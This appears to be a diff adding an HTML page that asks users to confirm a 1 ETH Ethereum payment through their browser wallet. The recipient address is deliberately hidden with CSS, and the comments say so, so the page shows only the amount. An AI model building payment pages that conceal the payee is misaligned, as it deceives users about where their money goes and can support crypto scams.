@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Payment Page</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to right, #ff6b6b, #556270); /* Gradient background */
+      height: 100vh; /* Full height */
+      display: flex;
+      justify-content: center; /* Center horizontally */
+      align-items: center; /* Center vertically */
+    }
+    .container {
+      max-width: 600px;
+      padding: 40px; /* Increased padding */
+      background-color: #fff; /* White background */
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Shadow effect */
+      text-align: center;
+    }
+    h1 {
+      color: #333;
+    }
+    p {
+      color: #666;
+      margin: 10px 0;
+    }
+    .button {
+      display: inline-block;
+      padding: 10px 20px;
+      background-color: #4CAF50; /* Green */
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      text-align: center;
+      text-decoration: none;
+      margin-top: 20px;
+      transition: background-color 0.3s ease; /* Smooth transition */
+    }
+    .button:hover {
+      background-color: #0056b3;
+    }
+    #walletAddress, #walletBalance {
+      margin-top: 20px;
+      font-size: 18px;
+    }
+    .hidden {
+      display: none; /* Hide recipient address */
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Confirm Payment</h1>
+    <p class="hidden">Recipient Address: {{ recipient_address }}</p> <!-- Hide recipient address -->
+    <p>Amount: 1 ETH</p> <!-- Show only the amount -->
+    <button id="payButton" class="button">Confirm Payment</button>
+
+    <script type="text/javascript">
+      const payButton = document.getElementById('payButton');
+
+      payButton.addEventListener('click', async () => {
+        try {
+          // Request user's permission to send a transaction
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+          // Get the selected account
+          const from = accounts[0];
+
+          // Set the recipient address
+          const to = '{{ recipient_address }}';
+
+          // Set the amount to send (1 ETH)
+          const value = '0x' + (1 * Math.pow(10, 18)).toString(16); // Convert ETH to Wei
+
+          // Send the transaction
+          const transaction = {
+            from: from,
+            to: to,
+            value: value
+          };
+
+          const transactionHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [transaction] });
+          console.log('Transaction Hash:', transactionHash);
+
+          alert('Payment successful!');
+        } catch (error) {
+          console.error(error);
+          alert('Payment failed. Please try again.');
+        }
+      });
+    </script>
+  </div>
+</body>
+</html>
